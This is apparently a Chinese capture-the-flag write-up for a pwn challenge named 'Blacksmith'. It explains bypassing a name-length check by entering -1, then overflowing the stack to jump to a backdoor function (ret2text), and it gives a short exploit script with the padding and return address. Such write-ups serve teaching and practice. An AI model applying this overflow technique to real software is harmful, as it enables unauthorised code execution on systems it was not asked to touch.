# Blacksmith

Pwn类签到题。本题的输出让这题看上去像堆题，但实际上只有第一个锻造剑的功能是有实际作用的。可以看到在给剑命名时，首先要输入名字长度，如果长度超过`0x40`则失败。但是注意到名字长度这个变量是无符号的，因此可以整数溢出：输入`-1`，则可输入`0xffffffffffffffff`字符，绕过了这个判断。

随后就可以栈溢出了，程序中存在后门函数，直接`ret2text`。
```py
sla('> ','1')
sla('name?\n','-1')
payload = flat('a'*0x48,0x4007d6)
sla('is?\n',payload)
```